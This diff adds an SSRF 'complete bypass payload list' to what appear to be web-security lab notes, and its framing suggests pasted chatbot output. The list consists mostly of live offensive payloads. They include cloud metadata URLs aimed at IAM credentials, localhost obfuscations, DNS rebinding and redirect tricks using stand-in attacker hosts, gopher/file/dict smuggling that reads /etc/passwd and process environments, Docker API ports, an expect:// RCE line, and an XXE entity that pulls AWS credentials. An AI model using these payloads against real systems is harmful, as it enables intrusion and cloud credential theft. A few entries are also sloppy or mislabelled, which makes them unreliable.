@@ -633,3 +633,281 @@ stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080
 
 ![img](images/9%20-%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/10.png)
 
+Below is the **SSRF – Complete Bypass Payload List**, written in the *exact same structure* and style as all your previous requests (Host Header, CORS, XXE, SQLi, etc.).
+
+This contains **real SSRF payloads**, including **cloud metadata**, **protocol smuggling**, **DNS rebinding**, **filter bypass**, **obfuscation**, and **privilege escalation** vectors.
+
+---
+
+# ⭐ **SSRF – Complete Bypass Payload List (Real Offensive Payloads)**
+
+---
+
+# **1. Core SSRF Payloads (Direct Requests)**
+
+```
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+```
+
+```
+http://127.0.0.1:80/admin
+http://localhost:8080/debug
+```
+
+---
+
+# **2. Cloud Metadata Endpoints (Critical Exploit Payloads)**
+
+### **AWS**
+
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### **GCP**
+
+```
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+### **Azure**
+
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+### **DigitalOcean**
+
+```
+http://169.254.169.254/metadata/v1.json
+```
+
+---
+
+# **3. Alternate IP Representations (Filter Bypass)**
+
+### **Decimal**
+
+```
+http://2130706433
+```
+
+### **Hex**
+
+```
+http://0x7f000001
+```
+
+### **Octal**
+
+```
+http://0177.0.0.1
+```
+
+### **IPv6-mapped IPv4**
+
+```
+http://[0:0:0:0:0:ffff:127.0.0.1]
+```
+
+---
+
+# **4. DNS Rebinding Payloads**
+
+```
+http://rebind.attacker.com
+http://session-rotate.attacker.net
+```
+
+Your domain should resolve:
+
+1. first → public IP
+2. next → 127.0.0.1
+
+Bypasses IP block checks.
+
+---
+
+# **5. Hostname Bypass Tricks**
+
+```
+http://localhost.evil.com
+http://metadata.google.internal.evil.com
+http://169.254.169.254.xip.io
+http://127.0.0.1.nip.io
+```
+
+---
+
+# **6. Double / Nested Redirect Bypass**
+
+```
+http://evil.com/redirect?to=127.0.0.1
+http://evil.com/→redirect→metadata
+```
+
+Often servers only validate the **first** hop.
+
+---
+
+# **7. Protocol Smuggling / Alternate Protocols**
+
+```
+gopher://127.0.0.1:25/_HELO%20test
+ftp://127.0.0.1/etc/passwd
+dict://127.0.0.1:9000/info
+```
+
+---
+
+# **8. File Protocol Bypass**
+
+```
+file:///etc/passwd
+file:///c:/windows/win.ini
+file:///proc/self/environ
+```
+
+---
+
+# **9. Using Internal Docker / K8s Networks**
+
+Docker default network:
+
+```
+http://172.17.0.1:2375
+http://172.17.0.2
+```
+
+Kubernetes:
+
+```
+http://10.0.0.1:443/api
+```
+
+---
+
+# **10. Open Redirect + SSRF Chains**
+
+```
+http://victim.com/redirect?next=http://127.0.0.1
+```
+
+---
+
+# **11. URL Obfuscation / Double Encoding**
+
+### URL-encoded
+
+```
+http://%31%32%37.0.0.1
+```
+
+### Double-encoded
+
+```
+http://%2531%2532%2537.0.0.1
+```
+
+### Mixed
+
+```
+http://127.%30.%30.%31
+```
+
+---
+
+# **12. Bypass Using @ Trick**
+
+```
+http://evil.com@127.0.0.1
+http://127.0.0.1@evil.com
+```
+
+---
+
+# **13. Bypass Using Userinfo Prefix**
+
+```
+http://admin:pass@127.0.0.1/
+```
+
+---
+
+# **14. Port Bypass (Privileged / Admin Services)**
+
+```
+http://127.0.0.1:22
+http://127.0.0.1:25
+http://127.0.0.1:2375   (Docker API)
+http://127.0.0.1:9200   (Elastic)
+http://127.0.0.1:11211  (Memcached)
+```
+
+---
+
+# **15. Wrapper-Based Bypasses**
+
+### PHP Filter
+
+```
+php://filter/convert.base64-encode/resource=http://127.0.0.1
+```
+
+### Expect Wrapper (RCE)
+
+```
+expect://id
+```
+
+---
+
+# **16. Using Non-HTTP Schemes to Break Validation**
+
+```
+mailto:test@localhost
+ssh://127.0.0.1:22
+telnet://127.0.0.1:80
+```
+
+---
+
+# **17. SSRF + File Upload Combination Attack**
+
+Upload a malicious URL:
+
+```
+http://127.0.0.1:8080/admin/upload
+```
+
+---
+
+# **18. Whitespace, Tabs & Control Char Bypass**
+
+```
+http://127.0.0.1%20
+http://127.0.0.1%09
+http://127.0.0.1%00anything
+```
+
+---
+
+# **19. Bypass Using Weird TLDs**
+
+```
+http://localhost.localdomain
+http://internal.victim
+```
+
+---
+
+# **20. Advanced Payload – Full AWS Token Extraction**
+
+```xml
+<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+```
